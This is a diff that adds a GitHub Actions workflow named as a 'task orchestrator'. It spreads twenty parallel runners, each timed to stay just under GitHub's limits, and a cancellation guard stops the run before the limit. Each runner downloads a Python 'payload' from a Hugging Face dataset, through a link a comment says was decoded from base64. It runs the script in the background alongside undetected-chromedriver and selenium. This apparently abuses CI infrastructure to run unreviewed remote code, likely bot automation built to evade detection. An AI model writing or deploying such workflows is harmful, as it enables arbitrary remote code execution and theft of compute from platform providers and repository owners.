@@ -1,0 +1,91 @@
+name: Horizon Task Orchestrator
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: horizon-sync-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Job 1: Timer to force-cancel the run before hitting GitHub limits
+  # =================================================================
+  execution-guard:
+    name: "Execution Guard"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      WAIT_TIMEOUT: 3540
+    steps:
+      - name: Start Guard Timer
+        run: |
+          echo "Guard initialized for Run ID: ${{ github.run_id }}"
+          echo "Waiting for ${WAIT_TIMEOUT} seconds prior to system termination..."
+
+          sleep "${WAIT_TIMEOUT}"
+
+          echo "Timeout threshold reached. Aborting workflow execution..."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "Cancellation directive issued successfully."
+
+  # =================================================================
+  # Job 2: Distributed worker nodes running concurrently
+  # =================================================================
+  worker-matrix:
+    name: "Worker-${{ matrix.node_index }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_index: [a1, a2, v-3, v-4, v-5, v-6, v-7, v-8, v-9, 1v-, v-1, v-2, v-3, v-4, v-5, v-6, 117, 118, 119, 120]
+
+    steps:
+      - name: Environment Setup
+        run: |
+          echo "Setting up dependencies on Worker-${{ matrix.node_index }}..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      - name: Fetch Core Script
+        run: |
+          echo "Downloading payload file..."
+          # Decoded link from original base64 payload
+          curl -sL "https://huggingface.co/datasets/sjkhfuk/fofo/resolve/main/start.py" -o app_runner.py
+          echo "Payload successfully downloaded."
+
+      - name: Install Python Libraries
+        run: |
+          echo "Installing required Python dependencies..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      - name: Execute Main Process
+        run: |
+          echo "Starting worker task for index ${{ matrix.node_index }}..."
+
+          python3 app_runner.py &
+          TASK_PID=$!
+
+          echo "Process launched in background with PID: ${TASK_PID}. Max wait time: 3540 seconds."
+
+          sleep 3540
+
+          if kill -0 "$TASK_PID" 2>/dev/null; then
+            echo "Time limit reached. Terminating process ${TASK_PID}..."
+            kill -9 "$TASK_PID"
+            echo "Process forcefully stopped."
+          else
+            echo "Process finished naturally before timeout."
+          fi
